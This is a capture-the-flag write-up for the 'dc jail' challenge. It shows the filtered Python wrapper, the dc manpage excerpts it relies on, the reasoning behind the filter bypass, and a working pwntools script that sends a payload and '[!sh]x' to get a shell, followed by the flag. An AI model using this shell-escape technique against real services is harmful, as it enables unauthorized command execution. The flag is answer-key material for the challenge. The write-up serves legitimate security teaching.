# dc jail

```
a "desk calculator" ... using "reverse polish notation" ... yeah this was not on my bucket list for year

nc challs1.pyjail.club 16303
```

Attachment:

```python
#!/usr/bin/python3

import os

inp = input('> ')
if any(c not in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxy' for c in inp):  # they gave me no blue raspberry dawg
    print('bad. dont even try using lowercase z')
    exit(1)

with open('/tmp/code.txt', 'w') as f:
    f.write(inp)

os.system(f'/usr/bin/dc -f /tmp/code.txt')

print("stop. you're done. get out.")
```

Reading the dc manpage, here are some interesting commands:

```man
       k      Pops the value off the top of the stack and uses it to set the precision.

       I      Pushes the current input radix on the stack.

       v      Pops one value, computes its square root, and pushes that.  The maximum of the
              precision  value  and  the  precision of the argument is used to determine the
              number of fraction digits in the result.

       Z      Pops a value off the stack, calculates the number of decimal digits it has (or
              number of characters, if it is a string) and pushes that  number.   The  digit
              count for a number does not include any leading zeros, even if those appear to
              the right of the radix point.

       d      Duplicates the value on the top of the stack,  pushing  another  copy  of  it.
              Thus, ``4d*p'' computes 4 squared and prints it.

       a      The  top-of-stack  is  popped.  If it was a number, then the low-order byte of
              this number is converted into a string and pushed onto the  stack.   Otherwise
              the  top-of-stack  was  a  string,  and  the first character of that string is
              pushed back.

       x      Pops a value off the stack and executes it as a macro.  Normally it should  be
              a string; if it is a number, it is simply pushed back onto the stack.  For ex‐
              ample, [1p]x executes the macro 1p which pushes 1 on the stack and prints 1 on
              a separate line.

       [characters]
              Makes a string containing characters (contained between balanced [ and ] char‐
              acters), and pushes it on the stack.  For example, [foo]P prints  the  charac‐
              ters foo (with no newline).

       !      Will  run  the rest of the line as a system command.  Note that parsing of the
              !<, !=, and !> commands take precedence, so if  you  want  to  run  a  command
              starting with <, =, or > you will need to add a space after the !.

       ?      Reads  a  line from the terminal and executes it.  This command allows a macro
              to request input from the user.
```

Here is the general idea:

1. To get shell, we need to use `!sh`
2. However, we cannot use `!`, so we put it into a string via `[!sh]`, and execute it with `x`: `[!sh]x`
3. However, we cannot use `[` for `]`, instead, we can use `a` to construct a single-character string, but `!sh` is too long
4. Therefore we use `[?]x` to readline from stdin and execute it
5. So we only need to construct `?` on the stack, which can be compute from 63 (ASCII of `?`) via `a`
6. To construct 63, we first push 10 (the default input radix) onto the stack via `I`
7. To make it larger, we extend the precision to 10 by `k`, then we can use `v` to compute `sqrt(10)` of precision 10: `3.1622776601`
8. `3.1622776601` has 11 digits, so applying `Z` to it gives us `11`
9. Set precision as `11` and repeat the process of `dZkv` (duplicate TOS, count its decimal digits, set as precision, square root), until we get 63

Attack:

```python
from pwn import *

# notes:
# [!sh]x: get shell
# [?]x: readline and eval
# 63a: push "?" to stack

# I: push 10
# k: pop 10, set precision = 10
# I: push 10
# v: pop 10, push sqrt(10)
# extend digits by (TOS means top of stack):
# 1. d: duplicate TOS
# 2. Z: pop and compute number of decimal digits of TOS
# 3. k: pop and set precision as TOS
# 4. v: pop TOS, push sqrt(TOS)
# p = process("dc")
p = remote("challs1.pyjail.club", 16303)
p.recvuntil(b"> ")
p.sendline(f"IkIv{'dZkv'*52}Zax".encode())
sleep(1)
p.sendline(f"[!sh]x".encode())
p.interactive()
```

Flag: `jail{but_does_your_desk_calculator_have_rce?_5c9cff7b71fc447d}`.
